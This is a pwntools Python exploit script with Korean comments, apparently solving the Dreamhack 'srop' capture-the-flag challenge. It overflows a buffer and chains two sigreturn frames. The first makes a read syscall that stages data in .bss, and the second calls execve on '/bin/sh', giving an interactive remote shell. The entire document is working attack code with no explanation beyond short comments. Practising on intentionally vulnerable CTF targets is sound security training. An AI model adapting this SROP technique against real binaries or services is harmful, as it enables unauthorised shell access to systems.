from pwn import *
p = remote('host3.dreamhack.games', 19520)
e = ELF('./srop')
context.arch = 'amd64'

pop_rax_syscall_ret = next(e.search(asm('pop rax; syscall; ret')))
syscall_ret = next(e.search(asm('syscall; ret')))
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0              # read syscall
frame.rdi = 0              # stdin
frame.rsi = bss            # read 결과를 저장할 곳
frame.rdx = 0x400          # 읽을 크기
frame.rip = syscall_ret    # syscall; ret
frame.rsp = bss            # read가 끝난 뒤 ret할 스택 위치

payload = b'A' * 16
payload += b'B' * 8
payload += p64(pop_rax_syscall_ret)
payload += p64(15)
payload += bytes(frame)
p.send(payload)

binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59             # execve syscall
frame2.rdi = binsh         # "/bin/sh" 문자열의 주소
frame2.rsi = 0             # argv
frame2.rdx = 0             # envp
frame2.rip = syscall_ret   # syscall; ret

payload2 = b''
payload2 += p64(pop_rax_syscall_ret)
payload2 += p64(15)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'
p.send(payload2)
p.interactive()